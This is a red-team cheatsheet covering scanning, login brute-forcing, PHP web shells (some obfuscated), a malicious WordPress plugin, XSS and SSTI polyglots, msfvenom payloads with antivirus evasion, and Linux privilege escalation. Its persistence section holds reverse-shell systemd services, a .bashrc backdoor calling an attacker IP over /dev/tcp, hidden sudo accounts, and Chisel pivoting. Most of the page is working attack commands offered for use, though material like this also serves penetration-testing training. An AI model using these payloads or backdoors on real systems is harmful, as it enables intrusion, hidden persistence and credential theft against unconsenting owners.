---
title: "Redteam Cheatsheet"
permalink: /cheatsheets/redteam-cheatsheet
---

# Redteam Cheatsheet

## Table of Contents:
- [List of Tools Mentioned](#list-of-tools-mentioned)
- [General Reconnaissance](#general-reconnaissance)
- [Web Applications](#web-applications)
    - [Subdomain Scanning](#subdomain-scanning)
    - [Directory Scanning](#directory-scanning)
    - [Parameter Fuzzing](#parameter-fuzzing)
    - [WordPress Scanning](#wordpress-scanning)
    - [WordPress Malicious Plugins and Themes](#wordpress-malicious-plugins-and-themes)
        - [WordPress Plugins](#wordpress-plugins)
        - [WordPress Themes](#wordpress-themes)
    - [Brute-Force Logins](#brute-force-logins)
    - [PHP Web Shells](#php-web-shells)
    - [SSTI](#ssti-server-side-template-injection)
    - [XSS](#xss-cross-site-scripting)
    - [Default Credentials](#default-credentials)
- [Finding Vulnerable Software Exploits](#finding-vulnerable-software-exploits)
- [Generating Payloads](#generating-payloads)
    - [MSFVenom](#msfvenom)
    - [revgen](#revgen)
- [FTP and SMB](#ftp-and-smb)
    - [FTP Anonymous Login](#ftp-anonymous-login)
    - [SMB Enumeration](#smb-enumeration)
        - [SMBMap](#smbmap)
        - [SMBClient](#smbclient)
- [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Find SUID Binaries](#find-suid-binaries)
    - [Find Files Containing Sensitive Information](#find-files-containing-sensitive-information)
    - [Check SUDO Privileges](#check-sudo-privileges)
    - [Writable /etc/passwd](#writable-etcpasswd-file)
    - [Readable /etc/shadow](#readable-etcshadow-file)
    - [Writable Cron Jobs](#writable-cron-jobs)
    - [Kernel Exploits](#kernel-exploits)
    - [linPEAS](#linpeas)
- [Linux Persistence Methods](#linux-persistence-methods)
    - [Persistence via SSH Keys](#persistence-via-ssh-keys)
    - [Creating a Privileged Local Account](#creating-a-privileged-local-account)
    - [Persistence via Web Shells](#persistence-via-web-shells)
    - [Persistence via System Services](#persistence-via-system-services)
    - [Persistence via Cron Jobs](#persistence-via-cron-jobs)
    - [Persistence via .bashrc Backdoor](#persistence-via-bashrc-backdoor)
- [Pivoting with Chisel](#pivoting-with-chisel)
    - [Chisel Reverse Tunneling](#chisel-reverse-tunneling)
    - [Chisel Bind Tunneling](#chisel-bind-tunneling)
    - [Chisel SOCKS5 Proxying](#chisel-socks5-proxying)

## List of tools mentioned:
- [NMAP](https://nmap.org/)
- [Rustscan](https://github.com/RustScan/RustScan)
- [GoBuster](https://github.com/OJ/gobuster)
- [FFUF](https://github.com/ffuf/ffuf)
- [FeroxBuster](https://github.com/epi052/feroxbuster)
- [Arjun](https://github.com/s0md3v/Arjun)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [revgen](https://github.com/acfirthh/revgen)
- [SMBMap](https://github.com/ShawnDEvans/smbmap)
- [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [TPLMap](https://github.com/epinna/tplmap)
- [Chisel](https://github.com/jpillora/chisel)

## General Reconnaissance
- Host Scanning (ping-sweep)

```
nmap -sn <IP/{subnet_mask}>
[Scans an IP range for alive hosts]

    Example:
    nmap -sn 10.0.0.0/24
    [Scans all IPs from 10.0.0.1 - 10.0.0.254]

for i in {1..254} ;do (ping -c 1 10.0.0.$i | grep "bytes from" &) ;done
[Ping-sweep using the ping tool (on Linux)]
```

- Open Port Scanning

```
nmap --min-rate 4500 --max-rtt-timeout 1500ms <IP|Hostname> -p-
[Scans all ports on a given target (You can remove -p- to only scan the top 1000 ports)]

rustscan -a <IP|Hostname> --ulimit 10000
[Scans all ports using rustscan]
```

- Service Scanning

```
nmap --min-rate 4500 --max-rtt-timeout 1500ms <IP|Hostname> -p- -sV
[Scans all ports and then attempts to find the services running on open ports]

rustscan -a <IP|Hostname> --ulimit 10000 -- -sV
[Uses rustscan to find open ports and then passes the open ports to NMAP to scan services]
```

## Web Applications
### Subdomain Scanning
```
gobuster vhost -u http(s)://<target.site> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r
[Uses GoBuster to scan a given target for 'vhosts' (subdomains)]

ffuf -u http(s)://<target.site> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<target.site> <filter_args>"
[Uses FFUF to scan for valid subdomains]

    Filtering:
        -fc     Filter by HTTP status codes. Comma separated list of codes
        -fl     Filter by amount of lines in response. Comma separated list of line counts
        -fs     Filter by HTTP response size. Comma separated list of sizes
        -fw     Filter by amount of words in response. Comma separated list of word counts
```

### Directory Scanning
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http(s)://<target.site>/FUZZ/ <filter_args>
[Uses FFUF to scan for valid directories]

    Filtering:
        -fc     Filter by HTTP status codes. Comma separated list of codes
        -fl     Filter by amount of lines in response. Comma separated list of line counts
        -fs     Filter by HTTP response size. Comma separated list of sizes
        -fw     Filter by amount of words in response. Comma separated list of word counts

gobuster dir -u http(s)://<target.site>/ -w /usr/share/wordlists/seclists/Web-Content/raft-large-directories.txt
[Uses GoBuster to scan for valid directories]

- Recursive Directory Scanning
feroxbuster -u http(s)://<target.site>/
[Uses FeroxBuster to recursively scan for valid directories]

- Scan for files
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -u http(s)://<target.site>/FUZZ/ <filter_args>
[Uses FFUF to scan for common files]

    Filtering:
        -fc     Filter by HTTP status codes. Comma separated list of codes
        -fl     Filter by amount of lines in response. Comma separated list of line counts
        -fs     Filter by HTTP response size. Comma separated list of sizes
        -fw     Filter by amount of words in response. Comma separated list of word counts
```

### Parameter Fuzzing
```
arjun -u http(s)://<target.site>/login.php
[Uses arjun to scan for valid parameters passed to a specified endpoint]
```

### WordPress Scanning
```
wpscan --url http(s)://<target.site>
[Uses WPScan to scan a WordPress site for themes and plugins]

- Enumerate Users
wpscan --url http(s)://<target.site> -e u
[Scans for valid user IDs and usernames]

- Enumerate All Plugins
wpscan --url http(s)://<target.site> -e ap
[Scans for all plugins]

- Enumerate Popular Plugins
wpscan --url http(s)://<target.site> -e p
[Scans for popular plugins]

- Enumerate All Themes
wpscan --url http(s)://<target.site> -e at
[Scans for all themes]

- Enumerate Popular Themes
wpscan --url http(s)://<target.site> -e t
[Scans for popular themes]

- Enumerate Vulnerable Plugins
wpscan --url http(s)://<target.site> -e vp
[Scans for vulnerable plugins]

- Enumerate Vulnerable Themes
wpscan --url http(s)://<target.site> -e vt
[Scans for vulnerable themes]

- Enumerate Config Backups
wpscan --url http(s)://<target.site> -e cb
[Scans for configuration backups]

- Brute-force Passwords for Found Usernames
wpscan --url http(s)://<target.site> -e u -P <password_list>
[Brute-forces password for enumerated users]

- Brute-force Passwords for Usernames in a list
wpscan --url http(s)://<target.site> -U <username_list> -P <password_list>
[Brute-forces passwords for supplied usernames]

- Stealthy Scan
wpscan --url http(s)://<target.site> --stealthy
[Only uses passive detection and uses random user-agents]
```

### WordPress Malicious Plugins and Themes
If you can get credentials for the admin user of a WordPress site, you can sometimes modify WordPress
themes or install plugins. Depending on the version of WordPress running as well as the
permissions on the underlying OS for installing plugins.

#### WordPress Plugins
A WordPress plugin, at its most basic form, is just a PHP file containing some comments at the top
which tell WordPress things like the name of the plugin, the version, the author, and some others.
Underneath the comments is where the main plugin code goes. The PHP file is then zipped into a .zip file
before being uploaded and installed.

Example Plugin Template:

```
<?php
/**
 * Plugin Name: MaliciousPlugin
 * Version: 1.2.3
 * Author: MaliciousPlugin
 * Author URI: http://maliciousplugin.fake
 * License: GPL2
 */

### MAIN PLUGIN CODE ###

?>
```

Malicious WordPress Plugin Example:
1. Create the malicious PHP code file

    ```
    <?php
    /**
    * Plugin Name: MaliciousPlugin
    * Version: 1.2.3
    * Author: MaliciousPlugin
    * Author URI: http://maliciousplugin.fake
    * License: GPL2
    */

    system($_GET['cmd']);

    ?>
    ```

2. Zip the file

    ```
    zip malicious.zip /path/to/plugin.php
    ```

Once the plugin is zipped, it can be uploaded via the WordPress Admin plugins panel.
After being installed, it can be accessed at:\
`http(s)://target.site/wp-content/plugins/<name_of_zip_file>/<name_of_PHP_file>.php?cmd=<command>`

The name of the .zip file dictates the location of where the plugin is accessible at.\
For example, you name the zip file "MyPlugin", you would have to access it at:\
`http(s)://target.site/wp-content/plugins/MyPlugin/<name_of_PHP_file>.php`

You can use whatever PHP code you want within the plugin.\
A good payload to use would be a reverse-shell payload, like the one written by [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/).
Just make sure you change the IP address and the port in the reverse-shell and have a listener set up waiting for a callback.\
Once the plugin is installed and you click "Activate Plugin", you should get a callback on your listener.

#### WordPress Themes
Depending on the version of WordPress running, you may be able to modify the PHP code within a theme in the "Theme Editor" page.

A common theme page to modify is the "404.php" page that is displayed when a user attempts to view a webpage that doesn't exist.

You should take note of the theme name that the page you are modifying is a part of.\
For example, common WordPress themes are named after the year they came out, like "TwentyTwentyFour". This will be used for accessing
the payload later.

After modifying the code of the page you want to make malicious, and saving it. You can activate the payload by visiting the page in
the browser:
`http(s)://target.site/wp-content/themes/<theme_name>/<malicious_page_name>.php`

### Brute-Force Logins
```
hydra -l <username> -P <password_file> <service>://<IP|Hostname>
[Uses Hydra to brute-force passwords for a specific username on a given service and target]

hydra -L <username_file> -P <password_file> <service>://<IP|Hostname>
[Brute-forces passwords for each username in the supplied username list]

hydra -C <username:password_file> <service>://<IP|Hostname>
[Tests credentials in a colon separated file supplied (eg. admin:password123)]

Optional Arguments:
    -w <number>     Time to wait (seconds) between retries
    -W <number>     Time to wait (seconds) between login attempts
    -s <number>     Specify a port
    -f              Stop the attack once a valid username and password are found
    -T <number>     Set a specific number of threads to use in the attack
    -o <filename>   Output scan results to given file
    -v              Verbose mode. Output more information

- Brute-force HTTP Logins (POST):
hydra -l <username> -P <password_file> <IP|Domain> http-post-form "/<login_endpoint>:<username_parameter>=<username>&<password_parameter>=^PASS^:<Incorrect_Password_String>"

- Brute-force HTTP Login (GET):
hydra -v -l <username> -P <password_file> "http-get://<IP|Domain>/<endpoint>:A=BASIC:F=<status_code_for_invalid_login>"

Common Supported Services:
[You can see the full list of supported protocols by running "hydra -h"]
    - FTP
    - http-{head|get|post}
    - http-{get|post}-form
    - IMAP
    - ldap(2|3)
    - mongodb
    - mssql
    - mysql
    - POP3
    - postgres
    - RDP
    - SMB
    - SMTP
    - SSH
    - telnet
    - VNC
```

### PHP Web Shells
```
Basic PHP Web Shells:

GET Request:
    <?php system($_GET['cmd']); ?>
    <?php echo exec($_GET['cmd']); ?>
    <?php passthru($_GET['cmd']) ?>
    [Interaction: 'curl http(s)://<target.site>/shell.php?cmd=<command>']

POST Request:
    <?php system($_POST['cmd']); ?>
    <?php echo exec($_POST['cmd']); ?>
    <?php passthru($_POST['cmd']) ?>
    [Interaction: 'curl -X POST http(s)://<target.site>/shell.php -d "cmd=<command>"']

More Advanced PHP Web Shells:
    <?php system($_SERVER['HTTP_USER_AGENT']); ?>
    [Interaction: 'curl http(s)://<target.site>/shell.php -A "<command>"']

    <?php echo exec($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
    [Interaction: 'curl http(s)://<target.site>/shell.php -H "Accept-Language: <command>"']

Obfuscated PHP Web Shells:
    <?php $_GET['1']($_GET['2']); ?>
    [Interaction: 'curl http(s)://<target.site>/shell.php?1=<function>&2=<command>']
    [Example: 'curl http(s)://<target.site>/shell.php?1=system&2=whoami']

    <?php $_POST['1']($_POST['2']); ?>
    [Interaction: 'curl -X POST http(s)://<target.site>/shell.php -d "1=<function>&2=<command>"']
    [Example: 'curl -X POST http(s)://<target.site>/shell.php -d "1=system&2=whoami"']

More Advanced Obfuscated PHP Web Shells:
    <?php
        if (isset($_GET['1']) and isset($_GET['2'])) {
            if (isset($_GET['3'])) {
                $_GET['1']($_GET['2'], $_GET['3']);
            } else {
                $_GET['1']($_GET['2']);
            }
        } else {
            die();
        }
    ?>

    This web shell allows for the use of functions where it takes two arguments.
    For example, you want to write a file on the target, you can use the function 'file_put_contents'.
    You would interact with it like so:
    'http(s)://<target.site>/shell.php?1=file_put_contents&2=<path_to_write_file>&3=<file_contents>'

    However, you can also use it as a regular web shell just to run commands:
    'http(s)://<target.site>/shell.php?1=system&2=whoami'

A way to obfuscate the interaction with the payload is to use Base64 encoded commands.

<?php
    $_GET['1'](base64_decode($_GET['2']));
?>
[Interaction: 'http(s)://<target.site>/shell.php?1=system&2=d2hvYW1pCg==']
['d2hvYW1pCg==' is the Base64 representation of the command 'whoami']
```

### SSTI (Server-Side Template Injection)
SSTI is the term used for injecting a payload, containing valid templating syntax, into a
web request that results in unintended output such as verbose errors, source code exposure,
variable value exposure, environment variable value exposure, and but not limited to
remote code execution.

You can use a SSTI polyglot to help identify an SSTI vulnerability, but it will not tell you
what templating engine is being used to allow you to craft a targeted payload.

```
SSTI Error-based Polyglot:
{% raw %}
<%'${{/#{@}}%>{{
{% endraw %}
```

As for identifying which templating engine is being used, you can follow a payload tree.\
A payload tree gives you different payloads to try, if it succeeds, then you continue to 
test further, if it fails, then the previous successful payload indicates the templating
engine being used.

There is a very in-depth SSTI payload tree on [hacktricks'](https://book.hacktricks.xyz)
webpage about [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

You can also use a tool named TPLMap to automatically test for SSTI, find a valid payload,
and attempt remote code execution for you.

### XSS (Cross-Site Scripting)
When testing for XSS it can be really time consuming testing hundreds of different payloads
with different keywords and syntax's.\
Luckily, there is an XSS polyglot that can simply be copied and pasted to help identify XSS
vulnerabilities much quicker.

[XSS Polyglot by 0xSobky](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
XSS Polyglot created by 0xsobky:

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Default Credentials
A lot of times, developers, webadmins, and sysadmins forget to change the default credentials for
services after the initial installation.

If you can find out the software/service and the version running then you can often do a simple
web search to find default credentials.

However, there is a Github respository that contains a CSV file full of default credentials for
different services. It is alphabetically ordered and updated regularly.

[Default Credentials Cheatsheet by ihebski](https://github.com/ihebski/DefaultCreds-cheat-sheet/)


## Finding Vulnerable Software Exploits
If you can find the version of a software being used, for example a WordPress plugin, you can search for the software or service name and the version on [exploit-db](https://www.exploit-db.com/) to see if there is an existing exploit that you can use.

You can also use a tool named [searchsploit](https://www.exploit-db.com/searchsploit), which is the command-line tool for the exploit-db website.\
You run the command: `searchsploit <software/service> <version>` to search for exploits.

Another method is loading up `msfconsole` and using the `search` command to search for a service to see if there is a metasploit module already created that you can use.


## Generating Payloads
### Msfvenom

You can use `msfvenom` to quickly generate a multitude of payload types.\
Including meterpreter shells which you can use to take advantage of metasploit modules within a compromised machine.

```
msfvenom --list all
[Used to list the available modules (payload, encoders, etc.)]

msfvenom -p <payload_type> LHOST=<Listener_IP|Hostname|Domain> LPORT=<Listener_Port> -f <output_format> -o <output_name>
[General msfvenom command template]

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Listener_IP> LPORT=<Listener_Port> -f exe -o payload.exe
[Generates a meterpreter shell for Windows (64-bit) in an EXE format]

You can use the '-e' argument and supply an encoder type to encode the payload, this can help prevent detection by AV (anti-virus) software.
```

- Setting up a listener

If you are using a meterpreter payload, you should setup a listener, before deploying the payload, using `msfconsole`.

```
Commands to run:

- msfconsole
- use exploit/multi/handler
- set PAYLOAD <payload_type_used>
- set LHOST <Listener_IP_used>
- set LPORT <Listener_Port_used>
- run
```
If the listener fails to start correctly, you should check that you are attempting to listen on the correct IP (LHOST).\
Another issue could be that if you are attempting to listen on a port below 1024, these are considered "privileged ports". You should run `msfconsole` with administrative permissions (using `sudo`).

### [revgen](https://github.com/acfirthh/revgen)

Another tool you can use to generate quick one-line reverse shell payloads is `revgen`.\
This is a tool written by myself in Python3. It is a command line tool that takes only three parameters, and one optional parameter.

```
Usage:

revgen -l/--lhost <Listener_IP> -p/--lport <Listener_Port> -f <payload_format>
[General revgen command template]

revgen -l <Listener_IP> -p <Listener_Port> -f bash
[Used to generate one-line bash reverse shell payloads for a given Listener IP and Port]

Optional Argument:
    -e <Encoding Type>

        Encoding Types:
            B   Base64
            U   URI Encoding

Supported Formats:
    - bash
    - nc
    - ncat
    - curl
    - rustcat
    - perl
    - php
    - python
    - ruby
    - socat
    - sqlite3
    - node.js
    - groovy
    - telnet
    - zsh
    - lua
    - golang
    - vlang
    - awk
    - crystal
    - powershell
```

#### Stabilising a Simple Reverse Shell
If you get a simple reverse shell, for example one that calls back to a netcat listener,
you may not be able to use all terminal features and commands such as the `clear` commmand
as well as terminal text editors like `nano` and `vim`.\
It is also easy to accidentally close a simple reverse shell by pressing `ctrl +c` as if 
you were halting a command whilst it was running.

Commands to Stabilise a Simple Reverse Shell:

```
1. Spawn a more interactive shell with Python or Python3
    python -c 'import pty; pty.spawn("/bin/bash")'
    or
    python3 -c 'import pty; pty.spawn("/bin/bash")'

2. Background the reverse shell
    CTRL + z

3. Correct terminal behaviour and foreground the reverse shell
    stty raw -echo; fg

4. Set the TERM environment variable so the terminal supports key features
    export TERM=xterm
```


## FTP and SMB
### FTP Anonymous Login
FTP (File Transfer Protocol) is used for allowing authorised users to transfer files between 
locations without the need for physical media. However, most FTP servers allow for the option
of "anonymous login". This means that a user named "anonymous" can access files on the FTP server
without the need for a password.

This can be done using the command: `ftp anonymous@<IP|Hostname>`

Anonymous login on FTP servers can be detected using NMAP:\
`nmap -p <FTP_Port_usually_21> --script ftp-anon <IP|Hostname>`

### SMB Enumeration
SMB is commonly used for network file shares allowing users to access files within a named share
across a network. They can also be publically accessible across the internet if it is configured
to be that way.

Sometimes, if misconfigured, and SMB server may allow "null logins", this is where a client is able
to authorise without the use of a username or password. This can be a vulnerability as it may allow
an attacker to see what file shares are available, and possibly read from or write to shares.

NMAP can be used to check for null logins and enumerate file shares on an SMB server:\
`nmap -p <SMB_Port_usually_445/139> --script smb-os-fingerprint,smb-enum-shares <IP|Hostname>`

#### SMBMap
SMBMap is a tool used for enumerating samba (SMB) shares. It has very simply syntax.

```
smbmap -H <IP|Hostname>
[Attempts to enumerate shares on a given host]

smbmap -H <IP|Hostname> -u <username> -p <password|NTLM_Hash>
[Attempts to enumerate shares on a given host using a username and password for authentication]
```

#### SMBClient
SMBClient is an FTP-like client used for accessing SMB shares.

```
Basic Usage:

smbclient //<IP|Hostname>/<share>
[Attempts to authenticate without username or password]

smbclient //<IP|Hostname>/<share> -U <username>
[Attempts to authenticate with just a username]

smbclient //<IP|Hostname>/<share> -U <username> --password=<password>
[Attempts to authenticate with a given username and password]
```


## Linux Privilege Escalation
### Find SUID Binaries
SUID (Set User-ID) binaries are executable files that run with the permissions of the
OWNER of the file rather than the user that runs the binary.\
If a file has the SUID bit set and is owned by root, it may be able to be exploited to
gain a shell as root.

```
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -4000 2>/dev/null

[Both commands search for SUID binaries starting at the root directory]
```
You should check found SUID binaries using [GTFObins](https://gtfobins.github.io/) to see
if there are any existing ways to exploit the binary for file read/write or gaining a root
shell.

### Find Files Containing Sensitive Information
You can search for files that may contain sensitive information using commands like:

```
find / -name "*.bak" 2>/dev/null
[Searches for backup files]

find / -name "*.kdbx" 2>/dev/null
[Searches for KeePass Password Manager database files containing passwords]
```

### Check SUDO Privileges
You can check your sudo privileges using the command: `sudo -l`\
This may require the user's password to be entered before it displays any information.

Key features to look out for:
    `NOPASSWD`      This means no password is required to run the presented commands using sudo.
    `(ALL : ALL)`   This means that the user can run all commands using sudo.

You should check binaries that you can run as sudo against [GTFObins](https://gtfobins.github.io/) to see if there are any exploits you can use to gain a root shell.

### Writable /etc/passwd File
If you have the permissions to write to the `/etc/passwd` file, you can set the password 
of the root user by generating a password hash using `openssl`.

```
Exploiting Writable /etc/passwd:

1. Check /etc/passwd permissions

    ls -l /etc/passwd

If the output looks like this, then it can be exploited:
    -rw-r--rw- 1 root root 4.2K Nov 20 15:08 /etc/passwd
            ^
        User writable

2. Generate a new password hash
    openssl passwd -1 <password>

3. Open the /etc/passwd file in a text editor like nano

4. Replace the 'x' in the root user line with the password hash
    root:x:0:0:root:/root:/bin/bash
         ^
     Hash here

5. Save the file

6. Run the command 'su root'

7. Enter the password you chose and you should be logged in as root
```

### Readable /etc/shadow File
If you can read the `/etc/shadow` file then you can extract the hashed password for users.
You can then attempt to crack these hashes using a tool like [Hashcat](https://github.com/hashcat/hashcat) or [JohnTheRipper](https://github.com/openwall/john).\
If the users password is not particularly strong, then you might be able to crack the hash
and login as that user.

### Writable Cron Jobs
You can view Cron jobs using the commands:

```
cat /etc/crontab
ls -a /etc/cron.d
```
If you can write/replace to the script or binary that is being run by a cron job by another
use then you may be able to escalate privileges or move laterally to another user.

### Kernel Exploits
You can find out the kernel by running the command `uname -r` and then search for exploits
for that specific kernel version.

### linPEAS
A common tool for checking for misconfigurations and finding vulnerabilities in Linux is linPeas.\
It checks for sudo vulnerabilities, file misconfigurations, attached network devices, and
lots more which can greatly assist in escalating privileges or moving laterally on a Linux
host.

[linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)


## Linux Persistence Methods
### Persistence via SSH Keys
You can maintain persistence into a compromised host by generating SSH keys on your
attacker machine and adding your SSH public key into the `/<username>/.ssh/authorised_keys`
file. You can also generate SSH keys on the compromised host and copy the private SSH key
to your attacker machine.

Generating SSH Keys on the Attacker Machine:

```
1. Run the command (attacker machine):
    ssh-keygen

2. Copy the SSH public key content

3. Paste the public key into the 'authorised_keys' file
    echo '<public_key_content>' >> /<username>/.ssh/authorised_keys

4. Login to the target using the command:
    ssh <username>@<IP|Hostname>
```

Generating SSH Keys on the Compromised Machine:

```
1. Run the command (compromised machine):
    ssh-keygen

2. Copy the SSH private key content

3. Paste the private key content into a file on the attacker machine

4. Change the permissions of the private key file (attacker machine):
    chmod 600 <private_key_file>

5. Login to the target using the command:
    ssh -i <private_key_file> <username>@<IP|Hostname>
```

### Creating a Privileged Local Account
If you have root permissions, then you can create a local account that you can maintain
access to if a previously compromised user's password is changed, or the initial compromise
method is patched.

When creating a new user account, you should use a username that is unlikely to be noticed
easily, like the name of a service that requires a user such as "ftp", "postgres", or
"mysql", amongst others. (Just make sure that the username you want to use does NOT already
exist by checking the `/etc/passwd` file.)

Create a Privileged Local Account:

```
1. Create a new user account with a username that blends in:
    useradd -m -s /bin/bash <username>

2. Add the created user to the sudo group:
    usermod -aG sudo <username>

3. Create a password for the newly created user:
    passwd <username>

4. You should now be able to login as that user via SSH, however you might want to
   add your SSH public key to the 'authorised_keys' in the users home directory as
   mentioned in the previous persistence method.
```

### Persistence via Web Shells
If the target has a website running on the host that uses PHP, you could add a PHP web shell
into the websites root directory that you can access via the browser to gain a reverse shell
or execute specific commands on the target.

This would also work with websites that use executable files in the webiste such as .aspx
files.

A drawback of this method is that, if the sysadmin has configured it correctly, the website
will most likely not be running as root and instead as a non-privileged user such as
`www-data`. This means that you would have to have a way to escalate your privileges after
gaining access to the target again. To do this, you could create a privileged local account,
as mentioned in the previous persistence method, that you can use to easily get root
permissions.

### Persistence via System Services
If you have root permissions, you can create a system service that runs automatically after
reboot as any user you want. The system service can be configured to run malicious commands
and call back to your attacker machine.

You could also modify an existing system service, to avoid detection, so it runs malicious
commands whenever the system service runs.

#### System Service:
System Service Example:

```
[Unit]
Description=ReverseShell
After=network.target
 
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<listener_ip>/<listener_port> 0>&1'
Restart=always
RestartSec=30
 
[Install]
WantedBy=multi-user.target
```
You should save this file as any filename with the extension `.service` and put it in
the `/etc/systemd/service/` directory.

To enable and start the service, run the commands:

```
(sudo) systemctl enable <service_name>.service
and
(sudo) systemctl start <service_name>.service

You can check the status of the service by running the command:
(sudo) systemctl status <service_name>.service
```

#### User Service:
If you do not have root permissions, you can still create a user service to retain 
persistence as a non-privileged user.

User Service Example:

```
[Unit]
Description=Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<listener_ip>/<listener_port> 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
```
You should save this file as any filename with the extension `.service` and put it in 
the `~/.config/systemd/user/` directory.\
If this directory does not exist, you can create it using the command:\
`mkdir -p ~/.config/systemd/user`

To enable and start the user service, run the commands:

```
systemctl --user enable <service_name>.service
and
systemctl --user start <service_name>.service

You can check the status of the service by running the command:
systemctl --user status <service_name>.service
```

Service Explanations:

```
Description     Short description of the system service
After           Is the process that the system service should start running after it starts

Type            Defines the behaviour of the service
ExecStart       The command to run when the service starts
Restart         Tells systemd if the service should restart if it stops due to an error
RestartSec      The number of seconds between the service stopping and it restarting

WantedBy        Specifies which runlevel or target the service should be associated with
                'multi-user.target' is most commonly used for system services whereas
                'default.target' is most commonly used for user services
```

### Persistence via Cron Jobs
You can add a cron job that runs in set intervals or after every reboot that calls a script
or binary that runs malicious code to do whatever you want, for example, run a reverse shell
that calls back to your attacker machine.

Add a Cron Job:

```
1. Open the crontab file for editing:
    crontab -e

2. Add the line below to the crontab file:
    * * * * * <user> <command_to_run>
    or
    * * * * * <user> </path/to/script/to/run.sh>

This will make the command or script run every minute as the specified user.
```

### Persistence via .bashrc Backdoor
A .bashrc backdoor consists of adding malicious bash code to the `.bashrc` file located
in the users home directory. The code is then run whenever the user logs in and opens a
terminal, such as an SSH login.\
This method also works with other shell types such as
`zsh`, the file would be called `.zshrc` and the steps to replicate it would still be the 
same.

Add malicious code to `~/.bashrc`:

```
1. Open .bashrc in a text editor
    nano ~/.bashrc

2. Add your malicious code into the file

3. Save the file

4. Wait for the code to execute when the user logs in

Example:
    Malicious code: 'bash -i >& /dev/tcp/10.0.0.21/4444 0>&1'
    This would open a reverse shell back to the attackers machine.
```

## Pivoting with Chisel
Chisel is a fast and easy-to-use tool for TCP and UDP tunneling and pivoting from
a compromsied host to other hosts or open ports within the network. It can be particularly
useful for when there are firewall rules in place preventing you from accessing specific 
hosts or ports from outside of the network, or preventing internal hosts from reaching out 
of the network back to the attacker machine.

Chisel supports tunneling over HTTP and HTTPS which can be useful for evading detection 
and circumventing network restrictions. It also supports reverse and bind tunneling. 
Reverse tunneling is when the client connects back to the attacker machine, and bind 
tunneling is when the attacker connects to an exposed port on the client machine. There 
are also precompiled binaries for Linux, OpenBSD, and Windows hosts allowing you to simply
transfer the binary over and start tunneling quickly.

### Chisel Reverse Tunneling
```
1. On the attacker machine, run the below command to setup a chisel server in reverse mode:
    ./chisel server -p <port_to_listen_on> --reverse

2. Download/upload the chisel binary onto the compromised machine

3. On the compromised machine, run the below command to connect back to the attacker
   machine and point connections to a specific IP and port:
    ./chisel client <listener_ip>:<listener_port> R:<local_tunnel_port>:<target_ip>:<target_port>

4. On the attacker machine you can now interact with the target port by accessing 
   localhost on the port opened on the attacker machine

Example commands:
    For this example, the attacker IP is 10.0.0.21
    and the compromised machine's IP is 10.0.0.42.

    1. (Attacker machine)
        ./chisel server -p 9000 --reverse

    2. (Compromised host)
        ./chisel client 10.0.0.21:9000 R:9001:127.0.0.1:80
    
    3. (Attacker machine)
        Interact with port 80 on the compromised machine by accessing localhost:9001
        in a browser
```

### Chisel Bind Tunneling
```
1. On the compromised machine, run the below command to setup a chisel server:
    ./chisel server -p <port_to_listen_on>

2. On the attacker machine, run the below command to connect to the compromised machine
   and bind a local tunnel port to the target IP and port:
    ./chisel client <listener_ip>:<listener_port> -b <bind_local_tunnel_port>:<target_ip>:<target_port>

3. On the attacker machine you can now interact with the target port by accessing 
   localhost on the port opened on the attacker machine

Example Commands:
    For this example, the attacker IP is 10.0.0.21
    and the compromised machine's IP is 10.0.0.42.

    1. (Compromised machine)
        ./chisel server -p 9000
    
    2. (Attacker machine)
        ./chisel client 10.0.0.42:9000 -b 9001:127.0.0.1:80
    
    3. (Attacker machine)
        Interact with port 80 on the compromised machine by accessing localhost:9001
        in a browser
```

Chisel also supports SOCKS proxying, allowing an attacker to add the IP and port to their
`proxychains.conf` file and use the `proxychains` command access hosts within the 
compromised network as if they were directly connected to the network.

### Chisel SOCKS5 Proxying
```
1. On the attacker machine, start the chisel server in SOCKS5 proxy mode:
    ./chisel server -p <port_to_listen_on> --socks5

2. On the compromised machine, connect back to the attacker machine and create a
   reverse SOCKS proxy:
    ./chisel client <listener_ip>:<listener_port> R:socks

3. On the attacker machine, add the SOCKS5 proxy to your 'proxychains.conf' file:
    socks5 <Listener_IP|127.0.0.1> <listener_port>

4. Use the 'proxychains' command to route traffic through the SOCK5 proxy to the
   compromised network.

Example Commands:
    For this example, the attacker IP is 10.0.0.21
    and the compromised machine's IP is 10.0.0.42.

    1. (Attacker machine)
        ./chisel server -p 9000 --socks5

    2. (Compromised machine)
        ./chisel client 10.0.0.21:9000 R:socks
    
    3. (Attacker machine)
        Add 'socks5 127.0.0.1 9000' to 'proxychains.conf'
    
    4. (Attacker machine)
        Use the 'proxychains' command to route your traffic through the proxy
```
